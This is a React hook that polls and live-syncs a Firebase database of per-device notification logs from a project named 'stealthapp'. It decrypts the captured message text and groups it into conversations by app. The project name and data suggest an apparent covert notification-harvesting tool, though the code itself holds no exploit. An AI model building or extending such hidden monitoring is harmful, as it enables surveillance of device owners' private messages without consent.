"use client";

import { useState, useEffect, useMemo, useCallback } from "react";
import { ref, onValue, off, query, limitToLast, orderByChild } from "firebase/database";
import { database, auth } from "@/lib/firebase/client";
import { organizeConversations } from "@/lib/utils/conversationGrouper";
import { useKeyVault } from "@/lib/encryption/KeyVaultContext";

/**
 * Parses RTDB snapshot and deduplicates telemetry packets by key and fingerprint
 */
function parseRtdbSnapshot(val, selectedDeviceId) {
  const items = [];
  if (!val || typeof val !== "object") return items;

  const seenKeys = new Set();
  const seenSignatures = new Set();

  function addItem(msgKey, msgVal, devId) {
    if (!msgVal || typeof msgVal !== "object") return;
    if (seenKeys.has(msgKey)) return;

    // Deduplication signature: device + timestamp + (raw_payload or notification_id or text)
    const sigPayload = msgVal.raw_payload || msgVal.text || msgVal.title || "";
    const sig = `${msgVal.device_id || devId}_${msgVal.timestamp || ""}_${msgVal.notification_id || ""}_${sigPayload}`;
    if (sigPayload && seenSignatures.has(sig)) return;

    seenKeys.add(msgKey);
    if (sigPayload) seenSignatures.add(sig);

    items.push({
      key: msgKey,
      val: { ...msgVal, device_id: msgVal.device_id || devId },
    });
  }

  if (selectedDeviceId) {
    for (const [msgKey, msgVal] of Object.entries(val)) {
      addItem(msgKey, msgVal, selectedDeviceId);
    }
  } else {
    for (const [devKey, devVal] of Object.entries(val)) {
      if (devVal && typeof devVal === "object") {
        for (const [msgKey, msgVal] of Object.entries(devVal)) {
          addItem(msgKey, msgVal, devKey);
        }
      }
    }
  }
  return items;
}

export function useFirebaseData(selectedDeviceId = null) {
  const [rawRecords, setRawRecords] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [conversations, setConversations] = useState([]);
  const [allMessages, setAllMessages] = useState([]);
  const [stats, setStats] = useState({
    totalMessages: 0,
    totalConversations: 0,
    totalDecrypted: 0,
    totalFailedDecryption: 0,
  });

  const { cryptoKey } = useKeyVault();

  // 1. Listen to Firebase Realtime Database with live WebSocket + auto-polling fallback
  useEffect(() => {
    let isMounted = true;
    setLoading(true);
    setError(null);

    const dbPath = selectedDeviceId
      ? `notifications_log/${selectedDeviceId}`
      : "notifications_log";

    // Immediate REST synchronization for instant loading & zero-refresh background sync
    const fetchImmediateRest = async () => {
      try {
        const token = auth.currentUser ? await auth.currentUser.getIdToken() : null;
        const authParam = token ? `?auth=${token}` : "";
        const url = `https://stealthapp-50da2-default-rtdb.firebaseio.com/${dbPath}.json${authParam}`;
        const res = await fetch(url);
        const data = await res.json();
        if (isMounted && data && typeof data === "object" && !data.error) {
          const parsed = parseRtdbSnapshot(data, selectedDeviceId);
          setRawRecords(parsed);
          setLoading(false);
        }
      } catch (err) {
        // Non-blocking background fetch
      }
    };

    fetchImmediateRest();

    // Auto-polling interval every 3.5s to ensure continuous real-time sync without page refresh
    const pollInterval = setInterval(() => {
      if (isMounted) {
        fetchImmediateRest();
      }
    }, 3500);

    const dbRef = ref(database, dbPath);

    const unsubscribe = onValue(
      dbRef,
      (snapshot) => {
        if (!isMounted) return;
        try {
          const val = snapshot.val();
          const items = parseRtdbSnapshot(val, selectedDeviceId);
          setRawRecords(items);
          setLoading(false);
          setError(null);
        } catch (err) {
          setError("Failed to parse synchronized records: " + err.message);
          setLoading(false);
        }
      },
      async (err) => {
        if (!isMounted) return;
        try {
          const token = auth.currentUser ? await auth.currentUser.getIdToken() : null;
          const authParam = token ? `?auth=${token}` : "";
          const url = `https://stealthapp-50da2-default-rtdb.firebaseio.com/${dbPath}.json${authParam}`;
          const res = await fetch(url);
          const data = await res.json();
          if (data && typeof data === "object" && !data.error) {
            const parsed = parseRtdbSnapshot(data, selectedDeviceId);
            setRawRecords(parsed);
            setLoading(false);
            setError(null);
            return;
          }
          if (data?.error) {
            setError("Firebase RTDB permission denied. Please verify Realtime Database security rules.");
          } else {
            setError("Firebase connection error: " + err.message);
          }
        } catch (fallbackErr) {
          setError("Firebase connection error: " + err.message);
        }
        setLoading(false);
      }
    );

    return () => {
      isMounted = false;
      clearInterval(pollInterval);
      if (typeof unsubscribe === "function") unsubscribe();
    };
  }, [selectedDeviceId]);

  // 2. Re-organize & decrypt whenever raw records OR encryption key changes
  useEffect(() => {
    let isCancelled = false;

    async function process() {
      try {
        const result = await organizeConversations(rawRecords, cryptoKey);
        if (!isCancelled) {
          setConversations(result.conversations);
          setAllMessages(result.allMessages);
          setStats(result.stats);
        }
      } catch (err) {
      }
    }

    process();

    return () => {
      isCancelled = true;
    };
  }, [rawRecords, cryptoKey]);

  // Unique devices
  const devices = useMemo(() => {
    const set = new Set();
    for (const r of rawRecords) {
      if (r.val && r.val.device_id) set.add(r.val.device_id);
    }
    return Array.from(set);
  }, [rawRecords]);

  // Unique apps
  const applications = useMemo(() => {
    const map = new Map();
    for (const r of rawRecords) {
      if (r.val && r.val.app_package_name) {
        const pkg = r.val.app_package_name;
        map.set(pkg, (map.get(pkg) || 0) + 1);
      }
    }
    return Array.from(map.entries()).map(([pkg, count]) => ({ pkg, count }));
  }, [rawRecords]);

  return {
    rawRecords,
    conversations,
    allMessages,
    devices,
    applications,
    stats,
    loading,
    error,
  };
}
